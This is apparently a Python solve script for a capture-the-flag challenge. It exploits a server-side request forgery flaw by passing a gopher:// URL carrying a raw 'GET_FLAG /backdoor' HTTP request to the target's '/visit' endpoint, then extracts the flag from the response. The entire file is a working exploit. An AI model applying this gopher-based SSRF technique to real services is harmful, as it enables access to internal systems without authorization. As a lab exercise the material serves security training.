#!/usr/bin/env python3
from urllib.parse import quote
from os import getenv
import requests, re

HOST = getenv('HOST') or 'localhost'
url = f'http://{HOST}:10003'

http_raw = """
GET_FLAG /backdoor HTTP/1.1
Host: localhost

""".replace('\r','').replace('\n','\r\n')

payload = f'gopher://localhost:80/_{quote(http_raw)}'
res = requests.get(url+'/visit', params={ 'url': payload })
# print(res.text)
flag = re.findall('SCIST{.+}', res.text)[0]
print(flag)
